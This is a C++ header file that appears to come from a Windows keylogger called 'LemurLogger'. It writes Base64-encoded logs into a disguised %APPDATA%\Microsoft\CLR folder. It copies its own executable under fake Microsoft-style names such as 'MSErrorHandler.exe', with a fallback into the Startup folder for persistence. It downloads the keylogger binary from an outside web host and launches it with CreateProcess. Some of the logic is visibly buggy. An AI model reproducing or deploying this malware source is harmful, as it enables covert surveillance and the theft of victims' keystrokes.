#ifndef IO_H
#define IO_H


#include <string>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include <Urlmon.h>
#include <urlmon.h>
#include <tchar.h>
#include <vector>
#include <wininet.h>
#include <sys/stat.h>

#pragma comment(lib, "Urlmon.lib")


namespace IO
{
  std::string GetOurPath(const bool append_seperator = false)
  {
    std::string appdata_dir(getenv("APPDATA"));
    std::string full = appdata_dir + "\\Microsoft\\CLR";
    return full + (append_seperator ? "\\" : "");
  }

  bool MkOneDr(std::string path)
  {
    return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
  }

  bool MkDir(std::string path)
  {
      for(char &c : path)
        if (c == '\\')
        {
            c = '\0';
            if (!MkOneDr(path))
                return false;
            c = '\\';
        }
    return true;
  }

  template <class T>
  std::string WriteLog(const T &t)
  {
    std::string path = GetOurPath(true);
    Helper::DateTime dt;
    std::string name = dt.GetDateTimeString("_") + ".log";

    try
    {
      std::ofstream file(path + name);
      if (!file) return "";
      std::ostringstream s;
      s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
      std::string data = BASE64::EncryptB64(s.str());
      file << data;
      if(!file) return "";
      file.close();
      return name;
    }
    catch(...)
    {
      return "";
    }
  }
    std::string getFileNameWithPath(){
        char szExeFileName[MAX_PATH];
        GetModuleFileName(NULL, szExeFileName, MAX_PATH);
        std::string::size_type pos = std::string( szExeFileName ).find_last_of( "\\/" );
        return std::string( szExeFileName ).substr( 0, pos);

    }

    bool copy(std::string path,std::string filename){

        //get self name
        std::string cur_path_filename = getFileNameWithPath();
        //open self
        std::ifstream initialFile(cur_path_filename, std::ios::in|std::ios::binary);
        //open outfile
        std::ofstream outputFile(path+filename, std::ios::out|std::ios::binary);
        //read pointer to end binary
        initialFile.seekg(0, std::ios::end);
        //set fileSize call buffer
        long fileSize = initialFile.tellg();
        if(initialFile.is_open() && outputFile.is_open())
        {
            short * buffer = new short[fileSize/2];
            initialFile.seekg(0, std::ios::beg);
            initialFile.read((char*)buffer, fileSize);
            outputFile.write((char*)buffer, fileSize);
            delete[] buffer;
        }
        else if(!outputFile.is_open())
        {
            return false;
        }
        else if(!initialFile.is_open())
        {
            return false;
        }

        initialFile.close();
        outputFile.close();
        return true;
    }



    void shell_cmd(std::string command){
        system(command.c_str());
    }

    bool copy_w_cmd(std::string path,std::string filename){
        std::string cur_path_filename = getFileNameWithPath();
        std::string command = "cp "+cur_path_filename+" "+path+filename;
        try {
            system(command.c_str());
        } catch (std::exception const& e) {
            return false;
        }
        return true;

    }

    bool ms_Copyfile(const char * desfile_path){
        const char * cur_path_filename = getFileNameWithPath().c_str();
        if (CopyFile (cur_path_filename, desfile_path, true))
            return false;

        else
           return true;

    }

    bool download_File(const char * urlfile,const char * despath)
    {


        //GetCurrentDirectory(MAX_PATH, path);
        //wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
        //printf("Path: %S\n", path);
        HRESULT res = URLDownloadToFile(NULL, urlfile, despath, 0, NULL);
        if(res == S_OK) {
            return true;
        } else if(res == E_OUTOFMEMORY) {
            return false;

        } /*else if(res == INET_E_DOWNLOAD_FAILURE) {
            return false;

        } */else {
            return false;
        }

        return false;
    }
    inline bool exists_file (const std::string& name) {
        struct stat buffer;
        return (stat (name.c_str(), &buffer) == 0);
    }
    void startup(LPCTSTR lpApplicationName) {
        // additional information
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        // set the size of the structures
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // start the program up
        CreateProcess(lpApplicationName,   // the path
                      "2",        // Command line
                      NULL,           // Process handle not inheritable
                      NULL,           // Thread handle not inheritable
                      FALSE,          // Set handle inheritance to FALSE
                      0,              // No creation flags
                      NULL,           // Use parent's environment block
                      NULL,           // Use parent's starting directory
                      &si,            // Pointer to STARTUPINFO structure
                      &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
        );
        // Close process and thread handles.
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    bool copy_File() {
        std::string appdata_dir(getenv("*APPDATA*"));
        std::string path = appdata_dir + "\\Microsoft\\Services\\";
        std::string filename = "MSErrorHandler.exe";
        std::string fullpath = path + filename;
        if (IO::exists_file(fullpath)) {
            std::string path = " C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
            std::string filename = "LLseervice.exe";
            std::string fullpath = path + filename;
        }
        if (!(IO::copy_w_cmd(path, filename))) {
            //do copy 2
            const char *desfile_path = fullpath.c_str();
            if (!(IO::ms_Copyfile(desfile_path))) {
                //do copy 3
                if (!(IO::copy(path, filename))) {
                    //do copy 4
                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
                    if (!(IO::download_File(url.c_str(), path.c_str()))) {

                        return false;
                    }
                }
            }
        } else {
            startup(fullpath.c_str());
            return true;
        }
    }


}


#endif // IO_H
